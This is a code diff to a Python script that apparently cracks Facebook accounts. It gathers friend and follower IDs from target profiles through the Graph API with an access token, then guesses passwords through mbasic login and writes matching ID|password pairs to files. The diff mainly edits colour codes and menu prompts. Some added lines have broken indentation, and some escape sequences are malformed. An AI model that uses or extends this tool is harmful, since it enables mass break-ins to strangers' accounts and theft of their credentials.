@@ -86,7 +86,8 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError:
-		token = raw_input("\033[1;31m[>] L O G I N - W I T H - T O K E N  : ")
+		token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N \033[1;33m : ")
+		print("IF you dont have Token Go Download !Get token app! ")
 		if token == "":
 			print("Wrong Input")
 		try:
@@ -121,10 +122,10 @@ def menu():
 	print("\033[1;37m[\033[1;32m03\033[1;37m] Crack from \033[1;32mMULTI-ID's \033[1;37m[\033[1;31mPRO\033[1;97m]")
 	print("\033[1;37m[\033[1;32m04\033[1;37m] Chack Crack \033[1;32mRESULTS")
 	print("\033[1;37m[\033[1;32m05\033[1;37m] User-agent \033[1;32mSETTINGS\033[1;97m[\033[1;91mPRO\033[1;97m]")
-    print("\n\033[1;37m[\033[1;32m06\033[1;37m] Unfriend all \033[1;32mFRIENDS")
-    print("\n\033[1;37m[\033[1;32m07\033[1;37m] Activate \033[1;37m[\033[1;31mGUARD ON\033[1;37m]")
-    print("\n\033[1;37m[\033[1;32m08\033[1;37m] Activate \033[1;37m[\033[1;31mLOCKED-PROFILE\033[1;37m]")
-    print("\n\033[1;37m[\033[1;32m09\033[1;37m] Crack Id's from \033[1;32mSEARCH NAME\033[1;37m")
+      print("\n\033[1;37m[\033[1;32m06\033[1;37m] Unfriend all \033[1;32mFRIENDS")
+      print("\n\033[1;37m[\033[1;32m07\033[1;37m] Activate \033[1;37m[\033[1;31mGUARD ON\033[1;37m]")
+      print("\n\033[1;37m[\033[1;32m08\033[1;37m] Activate \033[1;37m[\033[1;31mLOCKED-PROFILE\033[1;37m]")
+      print("\n\033[1;37m[\033[1;32m09\033[1;37m] Crack Id's from \033[1;32mSEARCH NAME\033[1;37m")
 	
 	print("\n\033[1;37m[\033[1;32m+\033[1;37m] For \033[1;37m[\033[1;31mpremium\033[1;37m] use/Access contact Aurthor on below link ")
 	print("\n\033[1;37m[\033[1;32m+\033[1;37m] Arthor Link \033[1;37m[\033[1;33https://www.facebook.com/me.fb/100008297554931\033[1;37m]")
@@ -210,7 +211,7 @@ def publik():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("\n\033[1;37m[\033[1;32m+\033[1;37m] Account Friend List is Not Public")
-	print("\033[1;31m[\033[1;31m+\033[1;31m] Total id  : \033[0;31m%s\033[0;31m"%(len(id))) 
+	print("\033[1;31m[\033[1;31m+\033[1;31m] Total id  : \033[1;31m%s\033[1;31m"%(len(id))) 
 
 def follower():
 	global token
@@ -226,7 +227,7 @@ def follower():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("URL Error")
-	print("[+] Total id  : \033[0;33m%s\033[0;33m"%(len(id))) 
+	print("[+] Total id  : \033[1;33m%s\033[1;33m"%(len(id))) 
 
 def massal():
 	global token
@@ -235,19 +236,19 @@ def massal():
 	except IOError:
 		exit("\033[1;31m[\033[1;31m+\033[1;31m] Token Error")
 	try:
-		tanya_Total = int(input("\033[1;37m[\033[1;32m+\033[1;37m] Enter Multi crack number 033[1;32[option] : "))
+		tanya_Total = int(input("\033[1;37m[\033[1;32m+\033[1;37m] Enter Multi crack number \033[1;32[option] \033[1;37: "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;31m[\033[1;31m+\033[1;37m] Target ID 033[1;32 %s : "%(t))
+		idt = raw_input("\033[1;37m[\033[1;32m+\033[1;37m] Target ID \033[1;37 %s : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
 				nama = i["name"].rsplit(" ")[0]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			print("\033[1;31m[\033[1;31m+\033[1;31m] Ids Friend list Is Not Public")
-	print("\033[1;33m[\033[1;33m?\033[1;33m] Total id  : \033[0;33m%s\033[0;33m"%(len(id)))
+			print("\033[1;37m[\033[1;32m+\033[1;37m] Ids Friend list Is Not Public")
+	print("\033[1;37m[\033[1;32m?\033[1;37m] Total id  : \033[1;33m%s\033[1;33m"%(len(id)))
 
 def method():
 	print("\n\033[1;37m[\033[1;32m?\033[1;37m] Pick cracking methord")
@@ -380,7 +381,7 @@ def mbasic(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m        "%(uid, pw))
+				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m"%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break 
